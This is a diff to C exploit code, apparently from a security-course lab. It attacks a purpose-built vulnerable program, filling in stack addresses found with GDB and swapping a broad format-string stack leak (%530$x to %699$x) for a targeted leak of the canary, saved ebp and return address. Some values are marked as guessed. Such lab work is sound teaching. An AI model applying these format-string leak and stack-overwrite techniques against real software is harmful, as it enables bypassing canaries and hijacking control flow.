@@ -128,17 +128,17 @@ int main(int argc, char* argv[]) {
    // Run vuln program under GDB. Set breakpoints in main_loop, auth and g
    // to figure out and populate the following values
 
-   void *auth_bp = 0xbfffe6f8;     // saved ebp for auth function
-   void *mainloop_bp = 0xbffff038; // saved ebp for main_loop
-   void *auth_ra = 0x0804899f;     // return address for auth
-   void *mainloop_ra = 0x0804a683; // return address for main_loop
+   void *auth_bp = 0xbfffe6a8;     // [FOUND] saved ebp for auth function
+   void *mainloop_bp = 0xbfffef88; // [FOUND] saved ebp for main_loop
+   void *auth_ra = 0x0804899f;     // [FOUND] return address for auth
+   void *mainloop_ra = 0x0804b695; // [FOUND] return address for main_loop
 
    // The following refer to locations on the stack
-   void *auth_user = 0xbfffe560;   // value of user variable in auth
-   void *auth_canary_loc = 0xbfffe6bc; // location where auth's canary is stored
-   void *auth_bp_loc = 0xbfffe6c8; // location of auth's saved bp
-   void *auth_ra_loc = 0xbfffe6cc; // location of auth's return address
-   void *g_authd = 0xbfffe6e4;     // location of authd variable of g
+   void *auth_user = 0xbfffe510;   // [FOUND] value of user variable in auth
+   void *auth_canary_loc = 0xbfffe69c; // [GUESSED] [or 0xbfffe66c] location where auth's canary is stored
+   void *auth_bp_loc = 0xbfffe648; // [FOUND] location of auth's saved bp
+   void *auth_ra_loc = 0xbfffe6ac; // [FOUND] location of auth's return address 
+   void *g_authd = 0xbfffe6c4;     // [FOUND] location of authd variable of g
 
    // These values discovered above using GDB will vary across the runs, but the
    // differences between similar variables are preserved, so we compute those.
@@ -155,15 +155,10 @@ int main(int argc, char* argv[]) {
    // main_loop function are stored. Use those offsets in the place of the
    // numbers in the format string below.
 
-   put_str("e 530 %530$x\n531 %531$x\n532 %532$x\n533 %533$x\n534 %534$x\n535 %535$x\n536 %536$x\n537 %537$x\n538 %538$x\n539 %539$x\n540 %540$x\n541 %541$x\n542 %542$x\n543 %543$x\n544 %544$x\n545 %545$x\n546 %546$x\n547 %547$x\n548 %548$x\n549 %549$x\n550 %550$x\n551 %551$x\n552 %552$x\n553 %553$x\n554 %554$x\n555 %555$x\n556 %556$x\n557 %557$x\n558 %558$x\n559 %559$x\n560 %560$x\n561 %561$x\n562 %562$x\n563 %563$x\n564 %564$x\n565 %565$x\n566 %566$x\n567 %567$x\n568 %568$x\n569 %569$x\n570 %570$x\n571 %571$x\n572 %572$x\n573 %573$x\n574 %574$x\n575 %575$x\n576 %576$x\n577 %577$x\n578 %578$x\n579 %579$x\n580 %580$x\n581 %581$x\n582 %582$x\n583 %583$x\n584 %584$x\n585 %585$x\n586 %586$x\n587 %587$x\n588 %588$x\n589 %589$x\n590 %590$x\n591 %591$x\n592 %592$x\n593 %593$x\n594 %594$x\n595 %595$x\n596 %596$x\n597 %597$x\n598 %598$x\n599 %599$x\n600 %600$x\n601 %601$x\n602 %602$x\n603 %603$x\n604 %604$x\n605 %605$x\n606 %606$x\n607 %607$x\n608 %608$x\n609 %609$x\n610 %610$x\n611 %611$x\n612 %612$x\n613 %613$x\n614 %614$x\n615 %615$x\n616 %616$x\n617 %617$x\n618 %618$x\n619 %619$x\n620 %620$x\n621 %621$x\n622 %622$x\n623 %623$x\n624 %624$x\n625 %625$x\n626 %626$x\n627 %627$x\n628 %628$x\n629 %629$x\n630 %630$x\n631 %631$x\n632 %632$x\n633 %633$x\n634 %634$x\n635 %635$x\n636 %636$x\n637 %637$x\n638 %638$x\n639 %639$x\n640 %640$x\n641 %641$x\n642 %642$x\n643 %643$x\n644 %644$x\n645 %645$x\n646 %646$x\n647 %647$x\n648 %648$x\n649 %649$x\n650 %650$x\n651 %651$x\n652 %652$x\n653 %653$x\n654 %654$x\n655 %655$x\n656 %656$x\n657 %657$x\n658 %658$x\n659 %659$x\n660 %660$x\n661 %661$x\n662 %662$x\n663 %663$x\n664 %664$x\n665 %665$x\n666 %666$x\n667 %667$x\n668 %668$x\n669 %669$x\n670 %670$x\n671 %671$x\n672 %672$x\n673 %673$x\n674 %674$x\n675 %675$x\n676 %676$x\n677 %677$x\n678 %678$x\n679 %679$x\n680 %680$x\n681 %681$x\n682 %682$x\n683 %683$x\n684 %684$x\n685 %685$x\n686 %686$x\n687 %687$x\n688 %688$x\n689 %689$x\n690 %690$x\n691 %691$x\n692 %692$x\n693 %693$x\n694 %694$x\n695 %695$x\n696 %696$x\n697 %697$x\n698 %698$x\n699 %699$x\n");
-   send();
-
-   unsigned output;
-   get_formatted("%s", &output);
-fprintf(stderr, "%s\n", "\n\n\n");
-
-
-   put_str("e %575$x %578$x %579$x\n");
+	//The return address (ra) is 555.
+	//The canary could be 519, 585, 586, or something else.
+	//The ebp could be 532, 538, 547, 549, 552, 554, 561, 562, 564, 573, 574, 602, 606, 609, 610, etc.
+   put_str("e %586$x %532$x %555$x\n");
    send();
 
    // Once all of the above information has been populated, you are ready to run
